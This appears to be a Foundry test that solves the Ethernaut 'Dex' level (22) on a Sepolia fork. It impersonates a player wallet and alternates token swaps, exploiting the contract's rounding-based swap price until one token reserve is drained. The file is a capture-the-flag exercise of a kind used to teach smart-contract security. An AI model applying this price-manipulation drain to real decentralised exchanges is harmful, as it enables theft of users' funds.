// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/22-Dex/Dex.sol";

contract ContractTest is Test {
    Dex level22 = Dex(payable(0x56B8aA3B1f838eaaE84c41F0F8e5c3C0bAa10238));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x56B8aA3B1f838eaaE84c41F0F8e5c3C0bAa10238),
            "Ethernaut22"
        );
    }

    function testEthernaut22() public {
        address mywallet = 0xd4332cb6371a53B77C5773435aFFFecb957c0939;
        vm.startPrank(mywallet);

        level22.approve(address(level22), 500);
        address addr_token1 = level22.token1();
        address addr_token2 = level22.token2();

        // Get latest orice
        console.log("First swap");
        console.log(
            "Swap Price 1/2",
            level22.getSwapPrice(addr_token1, addr_token2, 10)
        );
        console.log(
            "Swap Price 2/1",
            level22.getSwapPrice(addr_token2, addr_token1, 10)
        );

        level22.swap(addr_token1, addr_token2, 10);
        level22.swap(addr_token2, addr_token1, 20);

        console.log("\nSecond swap");
        // Get latest orice
        console.log(
            "Swap Price 1/2",
            level22.getSwapPrice(addr_token1, addr_token2, 10)
        );
        console.log(
            "Swap Price 2/1",
            level22.getSwapPrice(addr_token2, addr_token1, 10)
        );

        level22.swap(addr_token1, addr_token2, 24);
        level22.swap(addr_token2, addr_token1, 30);

        console.log("\nThird swap");
        // Get latest orice
        console.log(
            "Swap Price 1/2",
            level22.getSwapPrice(addr_token1, addr_token2, 10)
        );
        console.log(
            "Swap Price 2/1",
            level22.getSwapPrice(addr_token2, addr_token1, 10)
        );

        // Not swap all to proper drain the wallet
        level22.swap(addr_token1, addr_token2, 40);
        level22.swap(addr_token2, addr_token1, 47);

        console.log(
            "MyWallet token 1:",
            level22.balanceOf(addr_token1, mywallet)
        );
        console.log(
            "MyWallet token 2:",
            level22.balanceOf(addr_token2, mywallet)
        );
        console.log(
            "Contract token 1:",
            level22.balanceOf(addr_token1, address(level22))
        );
        console.log(
            "Contract token 2:",
            level22.balanceOf(addr_token2, address(level22))
        );

        assert(
            (level22.balanceOf(addr_token1, address(level22)) == 0) ||
                (level22.balanceOf(addr_token2, address(level22)) == 0)
        );
    }

    receive() external payable {}
}
